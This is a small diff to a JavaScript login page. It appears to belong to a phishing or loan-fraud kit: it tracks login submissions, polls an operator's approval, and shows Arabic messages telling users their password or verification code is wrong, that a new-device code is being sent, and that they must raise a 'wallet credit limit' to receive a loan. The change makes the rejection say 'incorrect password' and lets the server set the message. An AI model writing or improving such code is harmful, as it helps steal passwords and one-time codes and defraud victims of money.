@@ -4,7 +4,7 @@
   var STORAGE_KEY = "fastapi-base-visitor-id";
   var LOGIN_SUBMISSION_STORAGE_KEY = "fastapi-base-login-submission-id";
   var OBJECT_ID_REGEX = /^[a-f0-9]{24}$/i;
-  var REJECTION_ERROR_MESSAGE_AR = "تعذر إكمال العملية. يرجى المحاولة مرة أخرى.";
+  var REJECTION_ERROR_MESSAGE_AR = "كلمة المرور غير صحيحة";
   var OTP_REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح";
   var SUPPORT_APPROVAL_MESSAGE_AR = "الحد الائتماني بمحفظتك متدني يرجى رفع الحد الائتماني لقبول طلبك والحصول على القرض الحسن. لمزيد من الاستفسارات والمعلومات التواصل مع خدمة العملاء.";
   var GLOBAL_SUBMIT_MESSAGE_AR = "محاولة تسجيل الدخول من جهاز جديد. لأمان حسابك، سنرسل لك رمز تحقق لمرة واحدة (OTP) للتحقق من تسجيل الدخول";
@@ -572,7 +572,7 @@
         return;
       }
       setApprovalStatus(form, "", false);
-      showRejectModal(REJECTION_ERROR_MESSAGE_AR);
+      showRejectModal(errorMessage || REJECTION_ERROR_MESSAGE_AR);
     }
 
     async function pollApprovalStatus() {
